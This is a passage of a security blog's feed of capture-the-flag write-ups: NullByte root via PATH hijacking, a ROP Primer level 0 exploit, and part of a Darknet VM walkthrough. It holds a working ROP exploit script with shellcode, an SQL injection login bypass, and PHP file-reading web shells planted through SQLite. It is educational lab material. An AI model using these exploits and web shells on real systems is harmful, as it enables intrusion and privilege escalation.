0016| 0xbff92fe0 --&amp;gt; 0xffffffff 
0020| 0xbff92fe4 --&amp;gt; 0xbff9300e --&amp;gt; 0x10804 
0024| 0xbff92fe8 --&amp;gt; 0xb7554bf8 --&amp;gt; 0x2aa0 
0028| 0xbff92fec --&amp;gt; 0x737091e3 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804841f in main ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now we can see that the argument being passed to system is &lt;code&gt;ps&lt;/code&gt;, critically without an absolute path.  This means all that&amp;rsquo;s required to highjack this binary, is a bit of PATH manipulation.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ramses@NullByte:/var/www/backup$ cp /bin/sh ps
ramses@NullByte:/var/www/backup$ export PATH=/var/www/backup:$PATH

ramses@NullByte:/var/www/backup$ ./procwatch 
# id
uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
# whoami
root
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;flag:485cf21adfc47fdddfc7e45f092151aa&#34;&gt;Flag&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;# cat /root/proof.txt
adf11c7a9e6523e630aaf3b9b7acb51d

It seems that you have pwned the box, congrats. 
Now you done that I wanna talk with you. Write a walk &amp;amp; mail at
xly0n@sigaint.org attach the walk and proof.txt
If sigaint.org is down you may mail at nbsly0n@gmail.com


USE THIS PGP PUBLIC KEY

-----BEGIN PGP PUBLIC KEY BLOCK-----
[...snip...]
-----END PGP PUBLIC KEY BLOCK-----
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>ROP Primer: Level 0</title>
      <link>https://rastamouse.me/writeups/2015/rop-primer-level-0/</link>
      <pubDate>Thu, 23 Jul 2015 00:00:00 +0000</pubDate>
      
      <guid>https://rastamouse.me/writeups/2015/rop-primer-level-0/</guid>
      <description>

&lt;p&gt;This VM is meant as a small introduction to 32-bit return-oriented-programming on Linux. It contains three vulnerable binaries, that must be exploited using ROP. There are three levels in total (0 to 2).&lt;/p&gt;

&lt;p&gt;The VM is running a webserver with some instructions on how to get started with level0, by SSH’ing in.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;level0@rop:~$ ls -l

-rw-r----- 1 level1 level1     25 Jan 20  2015 flag
-rwsr-xr-x 1 level1 level1 595992 Jan 20  2015 level0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A SUID binary and a flag, both owned by &lt;code&gt;level1&lt;/code&gt;. Exploiting the binary will give us access to the flag, nice and easy.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;level0@rop:~$ ./level0
[+] ROP tutorial level0
[+] What&#39;s your name? Rasta Mouse
[+] Bet you can&#39;t ROP me, Rasta Mouse!

level0@rop:~$ file level0
level0: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.26, BuildID[sha1]=fb91c352b4d0f9680d22497e348340fe88d0fdf8, not stripped

level0@rop:~$ gdb -q level0
Reading symbols from level0...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled

level0@rop:~$ cat /proc/sys/kernel/randomize_va_space
0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It’s handy that &lt;code&gt;peda&lt;/code&gt; has been installed on the VM, as that should make things a bit easier. The binary is statically linked, compiled with a non-exec stack and ASLR has been disabled.&lt;/p&gt;

&lt;p&gt;We can force the binary into a seg fault by sending it a large input.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;level0@rop:~$ python -c &#39;print &amp;quot;A&amp;quot; * 50&#39; | ./level0
[+] ROP tutorial level0
[+] What&#39;s your name? [+] Bet you can&#39;t ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
Segmentation fault
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We can find what is getting overwritten in gdb.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;level0@rop:~$ python -c &#39;print &amp;quot;A&amp;quot; * 50&#39; &amp;gt; exploit

level0@rop:~$ gdb -q level0
gdb-peda$ r &amp;lt; exploit

EAX: 0x0
EBX: 0x0
ECX: 0xbffff6ac --&amp;gt; 0x80ca720 --&amp;gt; 0xfbad2a84
EDX: 0x80cb690 --&amp;gt; 0x0
ESI: 0x80488e0 (&amp;lt;__libc_csu_fini&amp;gt;:  push   ebp)
EDI: 0x41578b07
EBP: 0x41414141 (&#39;AAAA&#39;)
ESP: 0xbffff700 --&amp;gt; 0x4141 (&#39;AA&#39;)
EIP: 0x41414141 (&#39;AAAA&#39;)

Stopped reason: SIGSEGV
0x41414141 in ?? ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We’ve overwritten EBP and crucially, EIP. Now find the offset.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ pattern_create 50
&#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA&#39;

Stopped reason: SIGSEGV
0x41414641 in ?? ()

gdb-peda$ pattern_offset 0x41414641
1094796865 found at offset: 44
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To test this out:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;level0@rop:~$ python -c &#39;print &amp;quot;A&amp;quot; * 44 + &amp;quot;BBBB&amp;quot;&#39; &amp;gt; exploit
gdb-peda$ r &amp;lt; exploit

Stopped reason: SIGSEGV
0x42424242 in ?? ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is good, as we have accurately targetted EIP. But now what… There are a couple of ways to solve this - one possibility is to construct a complete ROP chain and set the registers up to use an execve syscall. Another is to use some of the handy shortcuts barrebas placed.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;system&lt;/code&gt; is not linked in the binary, but &lt;code&gt;mprotect&lt;/code&gt; and &lt;code&gt;read&lt;/code&gt; are.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ p system
No symbol table is loaded.

gdb-peda$ p mprotect
$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0x80523e0 &amp;lt;mprotect&amp;gt;

gdb-peda$ p read
$2 = {&amp;lt;text variable, no debug info&amp;gt;} 0x80517f0 &amp;lt;read&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We can use &lt;code&gt;mprotect&lt;/code&gt; to effectively undo the protection provided by &lt;code&gt;NX&lt;/code&gt;; then &lt;code&gt;read&lt;/code&gt; shellcode in.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ b main
gdb-peda$ r
gdb-peda$ vmmap
Start      End        Perm    Name
0x08048000 0x080ca000 r-xp    /home/level0/level0
0x080ca000 0x080cb000 rw-p    /home/level0/level0
0x080cb000 0x080ef000 rw-p    [heap]
0xb7fff000 0xb8000000 r-xp    [vdso]
0xbffdf000 0xc0000000 rw-p    [stack]
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;mprotect:04d2e7465572fb94993a8c8ea7ea7ff0&#34;&gt;mprotect&lt;/h2&gt;

&lt;p&gt;These are the areas of memory, none of which are executable (donated by the &lt;code&gt;x&lt;/code&gt; character). I’m going to make part of the &lt;code&gt;[stack]&lt;/code&gt; region executable, so let’s start building our exploit.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#/usr/bin/python

import struct

def p(x):
        return struct.pack(&#39;&amp;lt;L&#39;, x)

rop = &amp;quot;&amp;quot;
rop += &amp;quot;A&amp;quot; * 44
rop += p(0x80523e0)     # mprotect
rop += &amp;quot;FAKE&amp;quot;           # fake ret
rop += p(0xbffdf000)    # stack
rop += p(0x100)         # size
rop += p(0x7)           # exec

print rop
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;level0@rop:~$ python exploit.py &amp;gt; exploit
gdb-peda$ r &amp;lt; exploit

Stopped reason: SIGSEGV
0x454b4146 in ?? ()

gdb-peda$ vmmap
Start      End        Perm    Name
0xbffdf000 0xbffe0000 rwxp    mapped
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The binary crashes on the &lt;code&gt;FAKE&lt;/code&gt; return address and we can see that the area of memory we specified is now executable. To clear up and prepare for the next step, we should clear those arguments for &lt;code&gt;mprotect&lt;/code&gt; off the stack. A &lt;code&gt;pop3ret&lt;/code&gt; will do the job - to find one we can utilise the &lt;code&gt;ropgadget&lt;/code&gt; in peda.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ ropgadget
pop3ret = 0x8048882
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Let’s use this as the return address for mprotect. For sanities sake, we’ll put a breakpoint there and step through the gadget.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ b *0x8048881

Breakpoint 1, 0x08048882 in __libc_setup_tls ()

=&amp;gt; 0x8048882 &amp;lt;__libc_setup_tls+498&amp;gt;:    pop    esi
   0x8048883 &amp;lt;__libc_setup_tls+499&amp;gt;:    pop    edi
   0x8048884 &amp;lt;__libc_setup_tls+500&amp;gt;:    pop    ebp
   0x8048885 &amp;lt;__libc_setup_tls+501&amp;gt;:    ret
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If we run though, EIP eventually seg faults on 0.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Stopped reason: SIGSEGV
0x00000000 in ?? ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We can now add a new instruction into the exploit, to ensure we still have control over execution flow.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;rop = &amp;quot;&amp;quot;
rop += &amp;quot;A&amp;quot; * 44
rop += p(0x80523e0)     # mprotect
rop += p(0x8048882)     # pop3ret
rop += p(0xbffdf000)    # stack
rop += p(0x100)         # size
rop += p(0x7)           # exec

rop += &amp;quot;BBBB&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Stopped reason: SIGSEGV
0x42424242 in ?? ()

0xbffdf000 0xbffe0000 rwxp    mapped
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;read:04d2e7465572fb94993a8c8ea7ea7ff0&#34;&gt;read&lt;/h2&gt;

&lt;p&gt;Now we can set up our ROP to &lt;code&gt;read&lt;/code&gt;. This will allow us to read shellcode from &lt;code&gt;stdin&lt;/code&gt; into our mapped area of the stack, and execute.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;rop = &amp;quot;&amp;quot;
rop += &amp;quot;A&amp;quot; * 44
rop += p(0x80523e0)     # mprotect
rop += p(0x8048882)     # pop3ret
rop += p(0xbffdf000)    # stack
rop += p(0x100)         # size
rop += p(0x7)           # exec

rop += p(0x80517f0)     # read
rop += &amp;quot;FAKE&amp;quot;           # fake ret
rop += p(0x0)           # stdin
rop += p(0xbffdf000)    # stack
rop += p(0x100)         # size
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In setting up read; we specify a fake return again, where to read from (stdin), the area of memory we wish to read into and the amount of memory.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Stopped reason: SIGSEGV
0x454b4146 in ?? ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now let’s replace the fake return address with the same pop3ret we used earlier. Then write a new block we can segfault on.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;rop = &amp;quot;&amp;quot;
rop += &amp;quot;A&amp;quot; * 44
rop += p(0x80523e0)     # mprotect
rop += p(0x8048882)     # pop3ret
rop += p(0xbffdf000)    # stack
rop += p(0x100)         # size
rop += p(0x7)           # exec

rop += p(0x80517f0)     # read
rop += p(0x8048882)       # fake ret
rop += p(0x0)           # stdin
rop += p(0xbffdf000)    # stack
rop += p(0x100)         # size 

rop += &amp;quot;BBBB&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Stopped reason: SIGSEGV
0x42424242 in ?? ()
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;stdin:04d2e7465572fb94993a8c8ea7ea7ff0&#34;&gt;stdin&lt;/h2&gt;

&lt;p&gt;Now we need to test that we can actually read something in from stdin and have it execute. We’ll replace &lt;code&gt;BBBB&lt;/code&gt; with the address of our executable stack location and run the exploit outside gdb.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#/usr/bin/python

import struct

def p(x):
        return struct.pack(&#39;&amp;lt;L&#39;, x)

rop = &amp;quot;&amp;quot;
rop += &amp;quot;A&amp;quot; * 44
rop += p(0x80523e0)     # mprotect
rop += p(0x8048882)     # pop3ret
rop += p(0xbffdf000)    # stack
rop += p(0x100)         # size
rop += p(0x7)           # exec

rop += p(0x80517f0)     # read
rop += p(0x8048882)     # pop3ret 
rop += p(0x0)           # stdin
rop += p(0xbffdf000)    # stack
rop += p(0x100)         # size 

rop += p(0xbffdf000)

print rop
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A quick and easy way to test the exploit, is to use a trap. This will stop execution flow just like a breakpoint does in gdb, and we get a message on stdout to let us know it’s happened.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;level0@rop:~$ (python exploit.py; python -c &#39;print &amp;quot;\xcc\xcc&amp;quot;&#39;) | ./level0
[+] ROP tutorial level0
[+] What&#39;s your name? [+] Bet you can&#39;t ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���!
Trace/breakpoint trap
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The final stage is to put some useful shellcode in.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali32:~# msfvenom -p linux/x86/exec cmd=/bin/sh -f c | tr -d \&amp;quot; | tr -d &amp;quot;;&amp;quot; | tr -d &#39;\n&#39;

\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;level0@rop:~$ (python exploit.py; python -c &#39;print &amp;quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80&amp;quot;&#39;; cat) | ./level0
[+] ROP tutorial level0
[+] What&#39;s your name? [+] Bet you can&#39;t ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���!
id
uid=1000(level0) gid=1000(level0) euid=1001(level1) groups=1001(level1),1000(level0)
whoami
level1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The additional &lt;code&gt;cat&lt;/code&gt; keeps the shell alive.&lt;/p&gt;

&lt;h2 id=&#34;flag:04d2e7465572fb94993a8c8ea7ea7ff0&#34;&gt;Flag&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;cat flag
flag{rop_the_night_away}
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>The Darkside of Darknet</title>
      <link>https://rastamouse.me/writeups/2015/the-darkside-of-darknet/</link>
      <pubDate>Tue, 09 Jun 2015 00:00:00 +0000</pubDate>
      
      <guid>https://rastamouse.me/writeups/2015/the-darkside-of-darknet/</guid>
      <description>

&lt;p&gt;It was coming up to the date of my SANS GWAPT exam when Darknet landed, which meant I couldn&amp;rsquo;t spend much time on it.  Since passing that exam, Darknet became my new evening activity.&lt;/p&gt;

&lt;h2 id=&#34;port-scan:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;Port Scan&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
|_http-title: Site doesn&#39;t have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          45933/udp  status
|_  100024  1          58932/tcp  status
58932/tcp open  status  1 (RPC #100024)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          45933/udp  status
|_  100024  1          58932/tcp  status
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;a-bit-of-fuzzing:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;A Bit of Fuzzing&lt;/h2&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/darknet-1/port80.png&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;There is nothing much to see on this page, but after a quick fuzz we find a new directory.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/darknet# wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.56.102/FUZZ/

==================================================================
ID	Response   Lines      Word         Chars          Request    
==================================================================

00052:  C=200     14 L	      57 W	    937 Ch	  &amp;quot; - access&amp;quot;
00181:  C=403     10 L	      30 W	    290 Ch	  &amp;quot; - cgi-bin&amp;quot;
00427:  C=403     10 L	      30 W	    288 Ch	  &amp;quot; - icons&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Within this directory is a file called &lt;code&gt;888.darknet.com.backup&lt;/code&gt;.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/darknet-1/access.png&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;After reading it, we can see it&amp;rsquo;s a Virtual Host config for Apache.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;&amp;lt;VirtualHost *:80&amp;gt;
    ServerName 888.darknet.com
    ServerAdmin devnull@darknet.com
    DocumentRoot /home/devnull/public_html
    ErrorLog /home/devnull/logs
&amp;lt;/VirtualHost&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Adding &lt;code&gt;888.darknet.com&lt;/code&gt; into &lt;code&gt;/etc/hosts&lt;/code&gt; takes us to a new page.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/darknet-1/login.png&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;h2 id=&#34;sqli-much:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;SQLi much?&lt;/h2&gt;

&lt;p&gt;This form seems to be vulnerable to SQL Injection, as entering a single quote in each field gives the following error:  &lt;code&gt;unrecognized token: &amp;quot;3590cb8af0bbb9e78c343b52b93773c9&amp;quot;&lt;/code&gt;.  This &amp;lsquo;token&amp;rsquo; is the MD5 sum of the &lt;code&gt;&#39;&lt;/code&gt; character (which tells us the form is MD5&amp;rsquo;ing the password before submission).  There also seems to be basic keyword filtering, as entering phrases such as &lt;code&gt;select&lt;/code&gt; or &lt;code&gt;=&lt;/code&gt; in the &lt;code&gt;username&lt;/code&gt; field produces an &lt;code&gt;Illegal&lt;/code&gt; message.&lt;/p&gt;

&lt;p&gt;The form requires both a username and password be present; so proceeding on the assumption &lt;code&gt;devnull&lt;/code&gt; is a valid username, we can start testing injections.&lt;/p&gt;

&lt;p&gt;I was able to bypass this login page by replacing the &lt;code&gt;=&lt;/code&gt; operator with &lt;code&gt;IS&lt;/code&gt;:  &lt;code&gt;username=devnull&#39; or &#39;a&#39; is &#39;a&amp;amp;password=rasta&amp;amp;action=Login&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;sql-admin:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;SQL Admin&lt;/h2&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/darknet-1/admin-sql.png&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;The next challenge we have is an SQL administrator box, where we can enter SQL commands and have them executed.  No feedback is given by the page, so everything is blind.  A popular approach to this, is to have the database write some data to a file.  With MySQL this can be achieved by using something like &lt;code&gt;select &amp;lt;text&amp;gt; into outfile &amp;lt;file&amp;gt;&lt;/code&gt; (assuming write permissions are present etc).&lt;/p&gt;

&lt;p&gt;However, this is not MySQL, but SQLite.  For which I had to do some Googling to find the right syntax.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;attach database &#39;/home/devnull/public_html/img/test.php&#39; as rasta;
create table rasta.test (code TEXT);
insert into rasta.test (code) VALUES (&amp;quot;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To find the writable directory I fuzzed &lt;code&gt;888.darknet.com&lt;/code&gt; and since there weren&amp;rsquo;t many options, I just tried each one in turn.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;00244:  C=403     10 L	      30 W	    287 Ch	  &amp;quot; - css&amp;quot;
00430:  C=403     10 L	      30 W	    289 Ch	  &amp;quot; - icons&amp;quot;
00432:  C=403     10 L	      30 W	    287 Ch	  &amp;quot; - img&amp;quot;
00435:  C=403     10 L	      30 W	    292 Ch	  &amp;quot; - includes&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Browsing to the page confirms it worked, and also allows us to collect some important information about the environment we&amp;rsquo;re in.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/darknet-1/sqli-phpinfo.png&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;A few things to note:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;disable_functions: system, eval, shell_exec, passthru, popen, proc_open, escapeshellarg, escapeshellcmd, exec, proc_close, proc_get_status, proc_nice, proc_terminate, pcntl_exec
open_basedir: /etc/apache2:/home/devnull:/tmp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;These disabled functions are going to make it a right pain to do anything.  To do more enumeration, I uploaded 2 more files: &lt;code&gt;dir.php&lt;/code&gt; and &lt;code&gt;file.php&lt;/code&gt;, which allowed me to view and read parts of the file system.&lt;/p&gt;

&lt;h4 id=&#34;dir-php:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;dir.php&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php echo &#39;&amp;lt;pre&amp;gt;&#39;; print_r(scandir($_REQUEST[&#39;dir&#39;])); echo &#39;&amp;lt;/pre&amp;gt;&#39;; ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;file-php:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;file.php&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php $file = fopen($_REQUEST[&#39;file’],’r&#39;); while(! feof($file)) { echo fgets($file). &#39;&amp;lt;br /&amp;gt;&#39;; } fclose($file); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;http://888.darknet.com/img/dir.php?dir=.

Array
(
    [0] =&amp;gt; .
    [1] =&amp;gt; ..
    [2] =&amp;gt; dir.php
)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Realistically, we can only traverse as far down as &lt;code&gt;/home/devnull&lt;/code&gt; where there is a &lt;code&gt;database&lt;/code&gt; directory, but we can&amp;rsquo;t read inside it.  We can read &lt;code&gt;/tmp&lt;/code&gt; but there is nothing in there, so that leaves &lt;code&gt;/etc/apache2&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;http://888.darknet.com/img/dir.php?dir=/etc/apache2

Array
(
    [0] =&amp;gt; .
    [1] =&amp;gt; ..
    [2] =&amp;gt; apache2.conf
    [3] =&amp;gt; conf.d
    [4] =&amp;gt; envvars
    [5] =&amp;gt; magic
    [6] =&amp;gt; mods-available
    [7] =&amp;gt; mods-enabled
    [8] =&amp;gt; ports.conf
    [9] =&amp;gt; sites-available
    [10] =&amp;gt; sites-enabled
)

http://888.darknet.com/img/dir.php?dir=/etc/apache2/sites-enabled

Array
(
    [0] =&amp;gt; .
    [1] =&amp;gt; ..
    [2] =&amp;gt; 000-default
    [3] =&amp;gt; 888.darknet.com
    [4] =&amp;gt; signal8.darknet.com
)
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;http://888.darknet.com/img/file.php?file=/etc/apache2/sites-enabled/signal8.darknet.com

ServerName signal8.darknet.com
ServerAdmin errorlevel@darknet.com
DocumentRoot /home/errorlevel/public_html

AllowOverride All
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;signal8:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;Signal8&lt;/h2&gt;

&lt;p&gt;Next, we can head on over to &lt;code&gt;signal8.darknet.com&lt;/code&gt; and we find another new page.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/darknet-1/signal8.png&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;Clicking on these links (URLs &lt;code&gt;http://signal8.darknet.com/contact.php?id=1&lt;/code&gt; and &lt;code&gt;?id=2&lt;/code&gt;) takes us to a page where we are given an email address for &lt;code&gt;devnull&lt;/code&gt; and &lt;code&gt;errorlevel&lt;/code&gt;.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/darknet-1/contact.png&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;There is a &lt;code&gt;robots.txt&lt;/code&gt; file which contains the entry &lt;code&gt;Disallow: /xpanel/&lt;/code&gt;.  Heading over there, you see another login page.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/darknet-1/xpanel.png&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;I didn&amp;rsquo;t think this would be &lt;em&gt;another&lt;/em&gt; SQLi challenge, so I went back to &lt;code&gt;contact.php&lt;/code&gt;, widened my net and started fuzzing the URL.&lt;/p&gt;

&lt;p&gt;I used the OWASP-ZAP Fuzzer for this task (I like BurpSuite, but holy hell are the Intruder restrictions annoying!) by capturing a GET request on &lt;code&gt;contact.php&lt;/code&gt; and fuzzing on the &lt;code&gt;id&lt;/code&gt; parameter with the &lt;code&gt;Injections/All_attack.txt&lt;/code&gt; file from &lt;code&gt;wfuzz&lt;/code&gt;.  Regardless of the data you submit, a &lt;code&gt;200 OK&lt;/code&gt; is always returned, so I was focused on the size of the response body.&lt;/p&gt;

&lt;p&gt;An empty response weighs in at anything up to 260 bytes (sometimes the body would include &lt;code&gt;h3&lt;/code&gt; tags and sometimes not).  There were only 6 responses with a body size greater than 260 bytes, so I took a closer look at those.  The following request caught my eye: &lt;code&gt;count(/child::node())&lt;/code&gt; because it returned the result &lt;code&gt;errorlevel@darknet.com&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This payload came from the &lt;code&gt;XML.txt&lt;/code&gt; wordlist.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&amp;hellip; Fast forward many hours of Googling&amp;hellip;&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&#34;xml-injection:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;XML Injection&lt;/h2&gt;

&lt;p&gt;I spent a lot of time reading up on how you could call and parse XML with PHP.  In my mind, I came up with something like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$xml = simplexml_load_file(&#39;users.xml&#39;);
$email = $xml-&amp;gt;xpath(&#39;/user/id/email&#39;);
echo $email;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The ID parameter is a variable defined by GET, which would probably look more like:&lt;/p&gt;

